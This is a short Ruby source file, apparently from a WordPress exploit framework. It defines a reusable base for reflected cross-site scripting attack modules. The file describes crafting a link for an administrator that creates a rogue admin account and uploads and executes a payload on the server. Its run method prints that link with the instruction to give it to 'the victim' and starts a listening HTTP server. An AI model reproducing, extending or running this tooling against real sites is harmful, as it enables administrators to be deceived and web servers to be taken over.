# Provides reusable functionality for reflected XSS modules.
module Wpxf::WordPress::ReflectedXss
  include Wpxf::WordPress::Xss

  def initialize
    super
    @success = false
    @info[:desc] = 'This module prepares a payload and link that can be sent '\
                   'to an admin user which when visited with a valid session '\
                   'will create a new admin user which will be used to upload '\
                   'and execute the selected payload in the context of the '\
                   'web server.'
  end

  def run
    unless respond_to? 'url_with_xss'
      fail 'Required method "url_with_xss" has not been implemented'
    end

    return false unless super
    emit_info 'Provide the URL below to the victim to begin the payload upload'
    puts
    puts url_with_xss
    puts

    start_http_server
    @success
  end
end